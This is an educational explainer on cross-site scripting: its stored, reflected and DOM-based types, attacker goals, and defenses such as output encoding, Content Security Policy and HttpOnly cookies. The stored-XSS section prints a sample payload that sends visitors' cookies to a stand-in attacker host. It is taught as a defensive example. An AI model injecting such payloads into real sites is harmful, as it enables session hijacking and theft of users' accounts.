# Cross-Site Scripting (XSS)

XSS is an attack where an attacker injects malicious JavaScript into a webpage that other users then load in their browsers. The victim's browser executes the script because it appears to come from a trusted source — the legitimate website.

---

## Which OSI Layer and Why

XSS is a **Layer 7 (Application)** attack. The malicious script travels as a normal string inside an HTTP request or response. From the network's perspective, it is valid HTTP on port 443.

A network firewall at Layers 3–4 sees valid TCP traffic to a web server. It has no concept of "this text field value contains a script tag." A WAF operating at Layer 7 can inspect HTTP content and detect script injection patterns.

---

## Three Types

**Stored XSS (Persistent):**  
The malicious script is saved in the database (e.g., a comment, a username, a message). Every user who loads the page containing that data runs the script.

```
Attacker posts a comment:
  Nice post! <script>document.location='http://evil.com?c='+document.cookie;</script>

Server stores this in database without sanitizing.

Every user who views the comments page:
  Browser renders the HTML, encounters the <script> tag
  Executes it — their cookies get sent to evil.com
```

**Reflected XSS:**  
The malicious script is in the URL, reflected back in the response. The victim must be tricked into clicking a crafted link.

```
Attacker sends victim a link:
  https://bank.com/search?q=<script>stealCookies()</script>

Server takes the q parameter and puts it in the HTML response.
Victim's browser loads the page, executes the injected script.
```

**DOM-based XSS:**  
The vulnerability is entirely in the browser-side JavaScript. The page's own scripts write data from the URL or other sources into the DOM without sanitization. The server is not involved in the injection.

---

## What Attackers Can Do

- **Cookie theft** — steal session cookies to hijack authenticated sessions
- **Keylogging** — record keystrokes for credential harvesting
- **Phishing** — inject fake login forms over the real page
- **Drive-by malware** — redirect to a site that exploits browser vulnerabilities
- **CSRF via XSS** — use the victim's authenticated session to make requests to the server

---

## Real Fix — Output Encoding

The actual defense is encoding user-supplied data before inserting it into HTML. Convert characters that have special meaning in HTML into their escaped equivalents:

```
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
& → &amp;
```

```python
# Vulnerable
html = "<p>" + user_comment + "</p>"

# Safe — escaped
from html import escape
html = "<p>" + escape(user_comment) + "</p>"
```

With encoding, `<script>` becomes `&lt;script&gt;`, which the browser displays as text, not executes as code.

---

## Additional Defenses

**Content Security Policy (CSP):**  
An HTTP response header that tells the browser which sources are allowed to run scripts on this page. A properly configured CSP blocks inline scripts entirely — even if an attacker injects a `<script>` tag, the browser refuses to execute it.

```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

**HttpOnly cookies:**  
Setting the `HttpOnly` flag on session cookies prevents JavaScript from reading them. Even if XSS executes, `document.cookie` returns an empty string for HttpOnly cookies.

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

**WAF:**  
Inspects HTTP requests and responses for known XSS patterns, blocks obvious injection attempts. Not a substitute for encoding, but an additional detection layer.
